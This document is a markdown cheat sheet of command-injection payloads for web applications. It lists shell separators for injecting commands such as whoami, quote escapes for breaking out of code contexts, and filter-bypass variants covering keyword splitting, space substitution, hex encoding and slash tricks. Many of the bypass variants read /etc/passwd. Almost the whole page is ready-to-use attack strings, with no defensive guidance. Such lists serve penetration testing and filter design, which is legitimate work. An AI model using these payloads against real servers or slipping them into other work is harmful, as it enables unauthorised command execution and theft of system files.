# Command injection

Abuse of functionality in web applications, where it is possible to inject arbitrary commands and takeover entire server.
Vulnerability often happens while using 'dangerous' functions that have ability to execute commands like PHP's system, shell_exec, passthru, exec. 

### Injection sequences
`;whoami;`  
`&whoami`  
`&&whoami`  
`|whoami`   
`||whoami`  
`%0awhoami`  

Unix-only  
`` ;`whoami`; ``  
`;$(whoami);`  

### Contexts
Depending on vulnerable functionality, escaping the code in order to inject commnands might be necessary.  
`';whoami`  
`');whoami`   
`");whoami`  
...  

### Keyword bypass
Different way of executing 'whoami' command. These could bypass sanitisations.  
`/usr/bin/wh?ami`  
`/usr/bin/who*mi`  
`/usr/bin/whoam[i]`  
`'w'h'o'a'm'i`  
`"w"h"o"a"m"i`  
`\w\h\o\a\m\i`  
`who''ami`  
`who""ami`   
`` w`u`h`u`o`u`a`u`m`u`i ``  
`w$(u)h$(u)o$(u)a$(u)m$(u)i`  

### Space bypass  
`CAT${IFS}/etc/passwd`  
`cat${IFS%??}/etc/passwd`    
`cat\t/etc/passwd`  
`{cat,/etc/passwd}`   
`X=$'cat\x20/etc/passwd'&&$X`  
`IFS=];a=cat]/etc/passwd;$a`  

With undefined variable combined with historic command reference.  
`$undefined $undefined`  
`cat!-1/etc/passwd`  

### Hex encoding bypasses
All of these execute 'cat /etc/passwd'.  
`` cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"` ``  
`` `echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'` ``  
`a=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $a`  
`` cat `xxd -r -p <<< 2f6574632f706173737764` ``  
`` cat `xxd -r -ps <(echo 2f6574632f706173737764)` ``

### Slash and Backslash bypass
`cat ${PWD:0:1}etc${PWD:0:1}passwd`  
`cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd`   

### Misc execution tricks
Through '$0' sequence.  
`echo whoami|$0`  

Through historic commands. '!!' and '!-1' equals to last command executed, '!-2', second to last, etc..  
`ami`    
`who`  
`!-1!-2`
